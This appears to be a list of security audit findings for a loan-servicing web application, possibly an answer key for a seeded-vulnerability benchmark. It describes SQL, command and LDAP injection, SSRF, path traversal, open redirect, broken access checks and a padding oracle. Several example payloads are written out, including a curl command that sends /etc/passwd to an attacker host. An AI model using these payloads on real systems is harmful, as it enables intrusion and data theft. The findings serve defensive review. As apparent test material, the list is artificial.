extra.message: `region` comes directly from `req.query.region` and is concatenated into a raw SQL string passed to `AppDataSource.query()` without parameterization. An attacker can break out of the ILIKE literal (e.g. `region=%' UNION SELECT ...--`) to exfiltrate arbitrary data from any table, or corrupt the query. Contrast with `searchApplicationsByPurposeKeyword` in applications.ts which correctly uses a parameterized `$1` placeholder for the same pattern.

`outputFormat` is taken from `req.query.format` with no validation/allowlist and interpolated directly into a shell command string executed via `execSync`. An attacker can supply e.g. `format=pdf; curl attacker.com/$(cat /etc/passwd)#` to achieve arbitrary OS command execution. The sibling endpoint `renderPortfolioSummary` (line ~226-241) fixes this exact issue by validating `format` against an allowlist and using `execFileSync` with an argument array and `shell:false`, confirming this is the vulnerable twin.

`designatePrimaryAccount` performs no ownership or role check before promoting an arbitrary `PaymentAccount` (looked up purely by `req.params.id`) to primary and overwriting its `bankName`/`routingNumber` with attacker-supplied values. Any authenticated user (including a borrower) can call `PUT /api/payment-accounts/:id/designate-primary` for any account belonging to any business and redirect that business's future loan disbursement to a bank account of their choosing. Compare to `retirePayoutAccount` just below it, which correctly checks `req.user.role === BORROWER` ownership or requires ADMIN.

extra.message: `importDocumentTemplateContent` takes a fully attacker-controlled URL from the `x-template-source-url` header and passes it directly to `fetch()` with no host allowlist, enabling SSRF against internal services (e.g. `http://169.254.169.254/...` or `http://core-banking.internal.example.com/...`) and reflecting the response back to the caller. The nearly identical `previewExternalTemplateSource` handler directly below it (line ~534-554) validates the hostname against `ALLOWED_TEMPLATE_HOSTS` before fetching, confirming this is the vulnerable twin.

`previewBusinessLetterhead` reads `profile.letterheadFilename` (a value the borrower fully controls via `PUT /api/borrowers/my`, see allowedFields at line 112) and joins it into `LETTERHEAD_DIR` with no path validation before `fs.readFileSync`. A borrower can set `letterheadFilename` to `../../../../etc/passwd` (or any absolute/relative traversal) so that when staff later preview it, arbitrary files on the server are read and returned. The very next handler, `previewBusinessSignature`, resolves the same kind of user-controlled filename and explicitly checks `filePath.startsWith(baseDir + path.sep)` before reading — confirming this is the unsafe twin.

`stageComplianceNote` joins the caller-supplied `noteFileName` directly into `COMPLIANCE_STAGING_DIR` and writes attacker-controlled `body` content with `fs.writeFileSync`, with no sanitization. A path like `noteFileName=../../../../tmp/evil.js` lets any underwriter/support/admin user write arbitrary files to arbitrary locations on disk. The very next handler, `archiveReviewMemo`, takes the same kind of user-supplied filename but calls `path.basename(memoFileName)` before joining it, confirming this is the unsafe twin.

extra.message: `publishProductBrochure` joins the caller-supplied `fileName` directly into `PRODUCT_ASSETS_DIR` with no sanitization (no `path.basename`, no extension allowlist) before writing attacker-controlled base64 content to disk. An admin-authenticated caller can supply `fileName=../../src/index.ts` or similar to write/overwrite arbitrary files outside the intended assets directory.

extra.message: `continueAfterVerification` builds the redirect target directly from the client-controlled `x-redirect-url` header (or `referer`) with no allowlist/host validation, then calls `res.redirect(nextUrl)`. An attacker can send an authenticated user to `GET /api/auth/continue` with `x-redirect-url: https://evil.example.com/phish` to redirect them off-site (useful for phishing after a legitimate-looking auth flow). Compare to `returnToQueue` in applications.ts, which restricts its redirect target to a fixed `QUEUE_RETURN_PATHS` allowlist, confirming this is the unsafe twin.

extra.message: `findEmployeeByBadgeId` builds an LDAP filter by interpolating the raw `badge_id` query parameter (`(uid=${badgeId})`) with no escaping, and passes it to `staffDirectoryClient.search`. An attacker (any admin-role account) can inject filter syntax such as `badge_id=*)(memberOf=*` to widen the match or exfiltrate unrelated directory entries. The sibling handler `verifyComplianceGroupMembership` right below it escapes the same kind of input with `ldapEscape(email)` before building its filter, confirming this is the unsafe twin.

`checkPartnerLedgerAccess` grants ledger-partner access based solely on the client-supplied `x-partner-role` request header (`partnerRole == "ledger-service"`), with no signature, shared secret, or `authenticate` middleware verifying the caller's identity. Any external caller can set this header to `ledger-service` to pass the check and page through payment account records.

`resumeLedgerSyncSession` verifies the ledger-sync session token with `{ ignoreExpiration: true }`, meaning a token issued with a 10-minute `expiresIn` (see `startLedgerSyncSession`) remains valid forever if leaked. The nearly identical `resumeDisbursementSyncSession` below (line ~240) verifies the same kind of token without `ignoreExpiration`, correctly enforcing expiry, confirming this is the unsafe twin.

`confirmPayoutDraft` decrypts caller-supplied ciphertext with AES-256-CBC (no MAC/authenticated encryption) and, on a padding failure, returns the raw `padErr.message` in the response body distinctly from the generic 'Malformed draft token' error used for all other failures. This distinguishable padding-error oracle allows a classic CBC padding-oracle attack to decrypt or forge the encrypted bank-account draft token without knowing `PAYOUT_DRAFT_KEY`. Contrast with the counteroffer resume token in decisions.ts, which uses AES-256-GCM (authenticated encryption) and returns one generic error for any failure.

extra.message: `initiateDisbursement` sends the core-banking `api_key` and the disbursement amount/account/application identifiers as URL query parameters over `CORE_BANKING_BASE_URL`, whose default and typical configured value is a plain `http://` URL — unlike `registerLedgerAccount` just below it, which explicitly upgrades the same base URL to `https:` before calling. Sending a long-lived API key and financial transaction data in a GET query string over cleartext HTTP exposes the secret and transaction details to network intermediaries and to logs/proxies that record request URLs.
